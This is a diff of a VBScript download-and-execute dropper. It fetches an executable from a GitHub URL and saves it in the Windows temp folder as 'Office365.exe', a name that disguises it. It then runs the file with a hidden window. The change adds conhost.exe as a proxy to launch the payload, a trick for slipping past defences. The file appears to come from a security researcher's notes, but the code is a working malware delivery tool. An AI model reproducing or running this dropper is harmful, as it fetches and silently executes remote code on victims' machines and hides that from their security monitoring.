@@ -1,7 +1,7 @@
 downloadURL = "https://github.com/initinfosec/notes-and-refs-public/raw/master/misc_resources/testDebugMsg.exe"
 saveAs = "c:\windows\temp\Office365.exe"
 parameters = ""
-
+proxyexec = "C:\windows\system32\conhost.exe"
 Dim sh: Set sh = CreateObject("WScript.Shell")
 out = sh.ExpandEnvironmentStrings(saveAs)
 
@@ -20,7 +20,7 @@ If xhr.Status = 200 Then
     End With
 
 ' STEP 3: Run file if downloaded
-    cmd = out & " " & parameters
+    cmd = proxyexec & " " & out & " " & parameters
     sh.Run cmd, 0, False
 End If
 
